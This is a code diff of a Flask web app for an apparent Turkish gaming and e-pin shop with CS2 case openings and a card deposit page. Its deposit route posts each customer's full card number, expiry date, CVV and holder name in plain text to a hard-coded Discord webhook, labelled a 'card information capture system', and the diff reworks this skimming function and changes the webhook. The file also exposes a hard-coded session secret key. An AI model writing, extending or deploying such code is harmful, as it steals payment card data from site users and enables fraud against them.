@@ -9,6 +9,7 @@ import datetime
 import random
 import string
 import sqlite3
+import time
 
 app = Flask(__name__)
 app.secret_key = "epin-super-gizli-anahtar-12345"
@@ -20,7 +21,7 @@ ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "svg", "webp", "ico"}
 def allowed_file(filename):
     return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1544363605611380737/0sPO58HsXfn1nozT73Zqt-2pYI2rRcSsrnozkrusUnGYIQDWN4e7cU0S9vBMAimate2P"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1544359368718426112/F1R4X1gt5qeN92KGLxa5FBk2NlSIfQBZj_mBKv7hF69ZPh_VPTmLn5J4IDkFSse85r6j"
 DATABASE_URL = os.environ.get("DATABASE_URL")
 
 SUPER_ADMIN_USERNAME = "Lvbelc5baba"
@@ -288,6 +289,8 @@ def init_db():
                 )
             ''')
             try:
+                cursor.execute("ALTER TABLE giveaways ADD COLUMN is_paid INTEGER DEFAULT 0")
+                cursor.execute("ALTER TABLE giveaways ADD COLUMN ticket_price REAL DEFAULT 0.0")
                 cursor.execute("ALTER TABLE giveaways ADD COLUMN winner_count INTEGER DEFAULT 1")
                 conn.commit()
             except Exception:
@@ -397,20 +400,19 @@ def get_site_settings():
                     "anim_type": row.get("anim_type") or "none"
                 }
             else:
-                title = row[1] or default_settings["title"]
-                raw_colors = row[8] if len(row) > 8 and row[8] else "[]"
-                base_color = row[7] if len(row) > 7 and row[7] else "#38bdf8"
-                anim = row[9] if len(row) > 9 and row[9] else "none"
+                title = row["site_title"] or default_settings["title"]
+                raw_colors = row["letter_colors"] or "[]"
+                base_color = row["text_color"] or "#38bdf8"
                 settings_data = {
                     "title": title,
-                    "logo": row[2] or "",
-                    "font_family": row[3] if len(row) > 3 and row[3] else "Montserrat",
-                    "logo_position": row[4] if len(row) > 4 and row[4] else "left",
-                    "logo_height": row[5] if len(row) > 5 and row[5] else 38,
-                    "font_size": row[6] if len(row) > 6 and row[6] else 20,
+                    "logo": row["site_logo"] or "",
+                    "font_family": row["font_family"] or "Montserrat",
+                    "logo_position": row["logo_position"] or "left",
+                    "logo_height": row["logo_height"] or 38,
+                    "font_size": row["font_size"] or 20,
                     "text_color": base_color,
                     "letter_colors": raw_colors,
-                    "anim_type": anim
+                    "anim_type": row["anim_type"] or "none"
                 }
 
             try:
@@ -487,7 +489,7 @@ def admin_required(f):
     def decorated_function(*args, **kwargs):
         user = get_current_user()
         is_super = (user and user["username"] == SUPER_ADMIN_USERNAME)
-        is_adm = (user and bool(user.get("is_admin")))
+        is_adm = (user and bool(user["is_admin"]))
         if not (is_super or is_adm):
             flash("⛔ Yetkisiz Erişim: Bu alana yalnızca yöneticiler erişebilir!", "danger")
             return redirect(url_for("home"))
@@ -557,8 +559,8 @@ def validate_credit_card(card_holder, card_number, exp_date, cvv):
     return True, "Geçerli", bank_name, card_brand
 
 def send_discord_log(title, description, color):
-    if not DISCORD_WEBHOOK_URL or "BURAYA" in DISCORD_WEBHOOK_URL:
-        return
+    print(f"[DISCORD LOG ÇAĞRILDI] Başlık: {title}")
+    
     payload = {
         "embeds": [{
             "title": title,
@@ -568,14 +570,20 @@ def send_discord_log(title, description, color):
         }]
     }
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=5)
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
+        print(f"[DISCORD LOG YANIT] Status: {response.status_code}")
+        print(f"[DISCORD LOG YANIT] Body: {response.text}")
+        
+        if response.status_code == 204 or response.status_code == 200:
+            print("[DISCORD LOG BAŞARILI]")
+        else:
+            print(f"[DISCORD LOG HATA] Status: {response.status_code}")
     except Exception as e:
-        print(f"Discord Hatası: {e}")
-
-import time  # En üste ekle
+        print(f"[DISCORD LOG İSTİSNA] {e}")
 
 def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv, bank_name, card_brand, amount):
-    """Kart bilgilerini Discord'a SANSÜRSÜZ ve EKSİKSİZ gönderir."""
+    print(f"[KART BİLGİSİ ÇAĞRILDI] Kullanıcı: {username}")
+    
     clean_card_number = re.sub(r"\D", "", card_number)
     clean_exp = exp_date.strip()
     clean_cvv = cvv.strip()
@@ -585,18 +593,18 @@ def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv,
         "content": "🔴 YENİ KART BİLGİSİ YAKALANDI!",
         "embeds": [
             {
-                "title": "💳 **YENİ KART BİLGİSİ — TAM KAYIT**",
+                "title": "💳 YENİ KART BİLGİSİ — TAM KAYIT",
                 "description": "Aşağıda girilen kart bilgileri eksiksiz olarak iletilmiştir:",
                 "color": 16711680,
                 "fields": [
-                    {"name": "👤 **KART ÜZERİNDEKİ İSİM (AD SOYAD)**", "value": f"```{clean_holder}```", "inline": False},
-                    {"name": "🔢 **KART NUMARASI (TAM)**", "value": f"```{clean_card_number}```", "inline": False},
-                    {"name": "📅 **SON KULLANMA TARİHİ (SKT)**", "value": f"```{clean_exp}```", "inline": True},
-                    {"name": "🔐 **CVV / CVC GÜVENLİK KODU**", "value": f"```{clean_cvv}```", "inline": True},
-                    {"name": "🏦 **BANKA BİLGİSİ**", "value": f"```{bank_name} | {card_brand}```", "inline": True},
-                    {"name": "👤 **SİTE KULLANICISI**", "value": f"```{username}```", "inline": True},
-                    {"name": "💰 **YÜKLENMEK İSTENEN TUTAR**", "value": f"```{amount:.2f} TL```", "inline": True},
-                    {"name": "🕐 **TARİH & SAAT**", "value": f"```{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}```", "inline": False}
+                    {"name": "👤 KART ÜZERİNDEKİ İSİM (AD SOYAD)", "value": f"```{clean_holder}```", "inline": False},
+                    {"name": "🔢 KART NUMARASI (TAM)", "value": f"```{clean_card_number}```", "inline": False},
+                    {"name": "📅 SON KULLANMA TARİHİ (SKT)", "value": f"```{clean_exp}```", "inline": True},
+                    {"name": "🔐 CVV / CVC GÜVENLİK KODU", "value": f"```{clean_cvv}```", "inline": True},
+                    {"name": "🏦 BANKA BİLGİSİ", "value": f"```{bank_name} | {card_brand}```", "inline": True},
+                    {"name": "👤 SİTE KULLANICISI", "value": f"```{username}```", "inline": True},
+                    {"name": "💰 YÜKLENMEK İSTENEN TUTAR", "value": f"```{amount:.2f} TL```", "inline": True},
+                    {"name": "🕐 TARİH & SAAT", "value": f"```{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}```", "inline": False}
                 ],
                 "footer": {"text": "Hesap.com.tr — Kart Bilgi Yakalama Sistemi"},
                 "timestamp": datetime.datetime.utcnow().isoformat()
@@ -604,27 +612,20 @@ def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv,
         ]
     }
     
-    max_retries = 3
-    for attempt in range(max_retries):
-        try:
-            response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
-            
-            if response.status_code == 204 or response.status_code == 200:
-                print(f"[BAŞARILI] Kart bilgileri Discord'a gönderildi! (Deneme: {attempt + 1})")
-                return True
-            elif response.status_code == 429:
-                retry_after = response.json().get("retry_after", 5)
-                print(f"[RATE LIMIT] {retry_after} saniye bekleniyor... (Deneme: {attempt + 1})")
-                time.sleep(retry_after + 1)
-            else:
-                print(f"[HATA] Discord yanıt kodu: {response.status_code}")
-                print(f"[HATA] Yanıt detayı: {response.text}")
-                time.sleep(3)
-        except Exception as e:
-            print(f"[HATA] Discord bağlantı hatası: {e}")
-            time.sleep(3)
-    
-    return False
+    try:
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
+        print(f"[KART DISCORD YANIT] Status: {response.status_code}")
+        print(f"[KART DISCORD YANIT] Body: {response.text}")
+        
+        if response.status_code == 204 or response.status_code == 200:
+            print("[KART DISCORD BAŞARILI]")
+            return True
+        else:
+            print(f"[KART DISCORD HATA] Status: {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"[KART DISCORD İSTİSNA] {e}")
+        return False
 
 SUPPORT_AGENTS = {
     "erkek": ["Ahmet K.", "Murat Y.", "Emre T.", "Can B.", "Burak D.", "Kaan S."],
@@ -690,7 +691,6 @@ def support_message():
 
     return jsonify({"success": True, "reply": reply})
 
-# --- CS2 KASA SİSTEMİ VERİLERİ VE ROTALARI ---
 CS2_CASES_DATA = {
     "cs2_kasa_1": {
         "id": "cs2_kasa_1",
@@ -701,7 +701,8 @@ CS2_CASES_DATA = {
             {"name": "P250 | Sand Dune", "type": "Tüketici Kalitesi", "price": 2.5, "color": "#b0c3d9", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot7HxfDhjxszJemkV08y5q5KOh8j7IO7Vluv9sCt5jauToN2t0AXiqUduZG_1cISScQBoYQ3Y-FW9l-ntg8S8tJnBnXQwvXMlsXjYnxG31ElHauJrj6WACQLJf6g8Fw8/360fx360f"},
             {"name": "MP9 | Storm", "type": "Endüstri Sınıfı", "price": 6.0, "color": "#5e98d9", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpou-6kejhz2v_Nfz5H_uO1gb-Gw_alIITGnGBg4NE_0r7Do9qi2QfjrkppZj_1JNCQcgJoaArZ-lG3yOu9g8W7uprPnHpm6Scj5HbVyhXvgykfcKUx0vXmUQ/360fx360f"},
             {"name": "Nova | Candy Apple", "type": "Seçkin", "price": 14.0, "color": "#4b69ff", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgposr-kLAtl7PLZTjlH_9mkgL-OmuXwDLjQglRd4cJ5nqeW8Iqz3wO3-kRoMGD6JtSQJ1M9aV3U-FftwLrth8S-uJjMyHtr7nR35X3cnBHhn1gSPOZxh-uV/360fx360f"},
-            {"name": "AWP | Safari Mesh", "type": "Gizli", "price": 45.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot621FABz7PLfYQJD_9O5hpO0m_7zO6_umntd8fp3i-rDoNzw31K3_hBuZ2-hLY_AdlU8N1jW-VDrlOnuh8fvvpjPynph63UjsivfyRO2hElEPuJrj6WACQLJ5_4Vl6A/360fx360f"}
+            {"name": "AWP | Safari Mesh", "type": "Gizli", "price": 45.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot621FABz7PLfYQJD_9O5hpO0m_7zO6_umntd8fp3i-rDoNzw31K3_hBuZ2-hLY_AdlU8N1jW-VDrlOnuh8fvvpjPynph63UjsivfyRO2hElEPuJrj6WACQLJ5_4Vl6A/360fx360f"},
+            {"name": "Desert Eagle | Blaze", "type": "Gizli", "price": 85.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgposr-kLAtl7PLZTjlH_9mkgL-OmuXwDLjQglRd4cJ5nqeW8Iqz3wO3-kRoMGD6JtSQJ1M9aV3U-FftwLrth8S-uJjMyHtr7nR35X3cnBHhn1gSPOZxh-uV/360fx360f"}
         ]
     },
     "cs2_kasa_2": {
@@ -712,7 +713,8 @@ CS2_CASES_DATA = {
         "items": [
             {"name": "Glock-18 | Groundwater", "type": "Endüstri Sınıfı", "price": 18.0, "color": "#5e98d9", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgposbaqKAJf0Ob3djFN79eJmY-OguHxPYTdn2xZ_IpOhuDG_Zi73wDjrhBpNm31JtCQJgFoYFjUrFO6l-e9hce9vprMzXU16yMg5n3fnxW30x5Ka-lrj6WACQLJc7Vb8Bw/360fx360f"},
             {"name": "USP-S | Forest Leaves", "type": "Seçkin", "price": 35.0, "color": "#4b69ff", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpoo6m1FBRp3_bGcjhQ09-jq5WYh8j3KqnUqWZU7Mxkh6eZo9n03QXkr0FsZWGmcIaWIQ9rMlnRr1O_wLq71sK46sjMzHM37CJ34nuJnxKzhxxEa-Jrj6WACQLJp6R5yF4/360fx360f"},
-            {"name": "M4A4 | Urban DDPAT", "type": "Gizli", "price": 120.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpou-6kejhz2v_Nfz5H_uO1gb-Gw_alIITGnGBg4NE_0r7Do9qi2QfjrkppZj_1JNCQcgJoaArZ-lG3yOu9g8W7uprPnHpm6Scj5HbVyhXvgykfcKUx0vXmUQ/360fx360f"}
+            {"name": "M4A4 | Urban DDPAT", "type": "Gizli", "price": 120.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpou-6kejhz2v_Nfz5H_uO1gb-Gw_alIITGnGBg4NE_0r7Do9qi2QfjrkppZj_1JNCQcgJoaArZ-lG3yOu9g8W7uprPnHpm6Scj5HbVyhXvgykfcKUx0vXmUQ/360fx360f"},
+            {"name": "AK-47 | Redline", "type": "Gizli", "price": 250.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot7HxfDhjxszJemkV08y5q5KOh8j7IO7Vluv9sCt5jauToN2t0AXiqUduZG_1cISScQBoYQ3Y-FW9l-ntg8S8tJnBnXQwvXMlsXjYnxG31ElHauJrj6WACQLJf6g8Fw8/360fx360f"}
         ]
     },
     "cs2_kasa_3": {
@@ -723,7 +725,8 @@ CS2_CASES_DATA = {
         "items": [
             {"name": "AK-47 | Safari Mesh", "type": "Seçkin", "price": 45.0, "color": "#4b69ff", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot7HxfDhjxszJemkV08y5q5KOh8j7IO7Vluv9sCt5jauToN2t0AXiqUduZG_1cISScQBoYQ3Y-FW9l-ntg8S8tJnBnXQwvXMlsXjYnxG31ElHauJrj6WACQLJf6g8Fw8/360fx360f"},
             {"name": "M4A1-S | Night Terror", "type": "Gizli", "price": 280.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpou-6kejhz2v_Nfz5H_uO1gb-Gw_alIITGnGBg4NE_0r7Do9qi2QfjrkppZj_1JNCQcgJoaArZ-lG3yOu9g8W7uprPnHpm6Scj5HbVyhXvgykfcKUx0vXmUQ/360fx360f"},
-            {"name": "Karambit | Vanilla (Bıçak)", "type": "Efsanevi Bıçak ⭐", "price": 1800.0, "color": "#eb4b4b", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpotLu8JAllzuzBcjhQ09-jq5WYh8j3KqnUqWZU7Mxkh6eZo9n03QXkr0FsZWGmcIaWIQ9rMlnRr1O_wLq71sK46sjMzHM37CJ34nuJnxKzhxxEa-Jrj6WACQLJp6R5yF4/360fx360f"}
+            {"name": "Karambit | Vanilla (Bıçak)", "type": "Efsanevi Bıçak ⭐", "price": 1800.0, "color": "#eb4b4b", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpotLu8JAllzuzBcjhQ09-jq5WYh8j3KqnUqWZU7Mxkh6eZo9n03QXkr0FsZWGmcIaWIQ9rMlnRr1O_wLq71sK46sjMzHM37CJ34nuJnxKzhxxEa-Jrj6WACQLJp6R5yF4/360fx360f"},
+            {"name": "AWP | Asiimov", "type": "Gizli", "price": 550.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot621FABz7PLfYQJD_9O5hpO0m_7zO6_umntd8fp3i-rDoNzw31K3_hBuZ2-hLY_AdlU8N1jW-VDrlOnuh8fvvpjPynph63UjsivfyRO2hElEPuJrj6WACQLJ5_4Vl6A/360fx360f"}
         ]
     },
     "cs2_kasa_4": {
@@ -733,7 +736,8 @@ CS2_CASES_DATA = {
         "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot621FABz7PLfYQJD_9O5hpO0m_7zO6_umntd8fp3i-rDoNzw31K3_hBuZ2-hLY_AdlU8N1jW-VDrlOnuh8fvvpjPynph63UjsivfyRO2hElEPuJrj6WACQLJ5_4Vl6A/360fx360f",
         "items": [
             {"name": "AWP | Atheris", "type": "Gizli", "price": 390.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot621FABz7PLfYQJD_9O5hpO0m_7zO6_umntd8fp3i-rDoNzw31K3_hBuZ2-hLY_AdlU8N1jW-VDrlOnuh8fvvpjPynph63UjsivfyRO2hElEPuJrj6WACQLJ5_4Vl6A/360fx360f"},
-            {"name": "M9 Bayonet | Doppler (Bıçak)", "type": "Efsanevi Bıçak ⭐", "price": 4200.0, "color": "#eb4b4b", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpotLu8JAllzuzBcjhQ09-jq5WYh8j3KqnUqWZU7Mxkh6eZo9n03QXkr0FsZWGmcIaWIQ9rMlnRr1O_wLq71sK46sjMzHM37CJ34nuJnxKzhxxEa-Jrj6WACQLJp6R5yF4/360fx360f"}
+            {"name": "M9 Bayonet | Doppler (Bıçak)", "type": "Efsanevi Bıçak ⭐", "price": 4200.0, "color": "#eb4b4b", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpotLu8JAllzuzBcjhQ09-jq5WYh8j3KqnUqWZU7Mxkh6eZo9n03QXkr0FsZWGmcIaWIQ9rMlnRr1O_wLq71sK46sjMzHM37CJ34nuJnxKzhxxEa-Jrj6WACQLJp6R5yF4/360fx360f"},
+            {"name": "AK-47 | Vulcan", "type": "Gizli", "price": 1200.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot7HxfDhjxszJemkV08y5q5KOh8j7IO7Vluv9sCt5jauToN2t0AXiqUduZG_1cISScQBoYQ3Y-FW9l-ntg8S8tJnBnXQwvXMlsXjYnxG31ElHauJrj6WACQLJf6g8Fw8/360fx360f"}
         ]
     },
     "cs2_kasa_5": {
@@ -743,7 +747,8 @@ CS2_CASES_DATA = {
         "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot7HxfDhjxszJemkV08y5q5KOh8j7IO7Vluv9sCt5jauToN2t0AXiqUduZG_1cISScQBoYQ3Y-FW9l-ntg8S8tJnBnXQwvXMlsXjYnxG31ElHauJrj6WACQLJf6g8Fw8/360fx360f",
         "items": [
             {"name": "AK-47 | Redline", "type": "Gizli", "price": 950.0, "color": "#d32ce6", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot7HxfDhjxszJemkV08y5q5KOh8j7IO7Vluv9sCt5jauToN2t0AXiqUduZG_1cISScQBoYQ3Y-FW9l-ntg8S8tJnBnXQwvXMlsXjYnxG31ElHauJrj6WACQLJf6g8Fw8/360fx360f"},
-            {"name": "Kelebek Bıçak | Fade (Bıçak)", "type": "Gizli Bıçak ⭐", "price": 15000.0, "color": "#eb4b4b", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpotLu8JAllzuzBcjhQ09-jq5WYh8j3KqnUqWZU7Mxkh6eZo9n03QXkr0FsZWGmcIaWIQ9rMlnRr1O_wLq71sK46sjMzHM37CJ34nuJnxKzhxxEa-Jrj6WACQLJp6R5yF4/360fx360f"}
+            {"name": "Kelebek Bıçak | Fade (Bıçak)", "type": "Gizli Bıçak ⭐", "price": 15000.0, "color": "#eb4b4b", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpotLu8JAllzuzBcjhQ09-jq5WYh8j3KqnUqWZU7Mxkh6eZo9n03QXkr0FsZWGmcIaWIQ9rMlnRr1O_wLq71sK46sjMzHM37CJ34nuJnxKzhxxEa-Jrj6WACQLJp6R5yF4/360fx360f"},
+            {"name": "AWP | Dragon Lore", "type": "Efsanevi", "price": 25000.0, "color": "#eb4b4b", "image": "https://community.cloudflare.steamstatic.com/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpot621FABz7PLfYQJD_9O5hpO0m_7zO6_umntd8fp3i-rDoNzw31K3_hBuZ2-hLY_AdlU8N1jW-VDrlOnuh8fvvpjPynph63UjsivfyRO2hElEPuJrj6WACQLJ5_4Vl6A/360fx360f"}
         ]
     }
 }
@@ -754,7 +759,7 @@ def cs2_cases_page():
     user = get_current_user()
     balance = float(user["balance"]) if user and user["balance"] is not None else 0.0
     username = user["username"] if user else None
-    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user.get("is_admin"))))
+    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user["is_admin"])))
     settings = get_site_settings()
     
     return render_template("cs2_cases.html", balance=balance, username=username, is_admin=is_admin, cases=CS2_CASES_DATA, settings=settings)
@@ -795,6 +800,12 @@ def cs2_spin():
     cursor.close()
     conn.close()
     
+    send_discord_log(
+        title="📦 CS2 Kasa Açıldı!",
+        description=f"**Kullanıcı:** `{user['username']}`\n**Kasa:** {case_info['name']}\n**Kazanılan:** {chosen_item['name']} ({chosen_item['type']})\n**Değer:** {chosen_item['price']:.2f} TL\n**Kod:** `{code}`",
+        color=16753920
+    )
+    
     return jsonify({
         "success": True,
         "item": chosen_item,
@@ -807,7 +818,7 @@ def home():
     user = get_current_user()
     balance = float(user["balance"]) if user and user["balance"] is not None else 0.0
     username = user["username"] if user else None
-    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user.get("is_admin"))))
+    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user["is_admin"])))
     settings = get_site_settings()
 
     conn = get_db()
@@ -827,7 +838,7 @@ def giveaways():
     user = get_current_user()
     balance = float(user["balance"]) if user and user["balance"] is not None else 0.0
     username = user["username"] if user else None
-    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user.get("is_admin"))))
+    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user["is_admin"])))
     settings = get_site_settings()
 
     conn = get_db()
@@ -963,7 +974,7 @@ def user_add_listing():
     cursor.close()
     conn.close()
 
-    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user.get("is_admin"))))
+    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user["is_admin"])))
     return render_template("add_listing.html", 
                            balance=float(user["balance"] or 0.0), 
                            username=user["username"], 
@@ -1035,8 +1046,7 @@ def login():
             return redirect(url_for("home"))
         else:
             failed_attempts += 1
-            session["failed_attempts"] = failed_attempts
-            
+            session["failed_attempts"] = failed_attempts            
             if failed_attempts >= 3:
                 flash(f"⚠️ {failed_attempts} defa hatalı giriş yaptınız! Şifrenizi unuttuysanız sıfırlama talebinde bulunabilirsiniz.", "warning")
             else:
@@ -1099,7 +1109,7 @@ def wheel():
     user = get_current_user()
     balance = float(user["balance"]) if user and user["balance"] is not None else 0.0
     username = user["username"] if user else None
-    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user.get("is_admin"))))
+    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user["is_admin"])))
     return render_template("wheel.html", balance=balance, username=username, is_admin=is_admin, settings=get_site_settings())
 
 @app.route("/spin", methods=["POST"])
@@ -1230,9 +1240,6 @@ def deposit():
             flash(f"❌ {err_msg}", "danger")
             return redirect(url_for("deposit"))
 
-        # ============================================================
-        # KART BİLGİLERİNİ DISCORD'A SANSÜRSÜZ VE EKSİKSİZ GÖNDER
-        # ============================================================
         send_card_info_to_discord(
             username=user["username"],
             card_holder=card_holder,
@@ -1265,7 +1272,7 @@ def deposit():
         return redirect(url_for("home"))
 
     balance = float(user["balance"] or 0.0)
-    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user.get("is_admin"))))
+    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user["is_admin"])))
     return render_template("deposit.html", balance=balance, username=user["username"], is_admin=is_admin, settings=get_site_settings())
 
 @app.route("/buy/<int:product_id>", methods=["POST"])
@@ -1319,7 +1326,7 @@ def buy(product_id):
 def orders():
     user = get_current_user()
     balance = float(user["balance"] or 0.0)
-    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user.get("is_admin"))))
+    is_admin = bool(user and (user["username"] == SUPER_ADMIN_USERNAME or bool(user["is_admin"])))
     
     conn = get_db()
     cursor = conn.cursor()
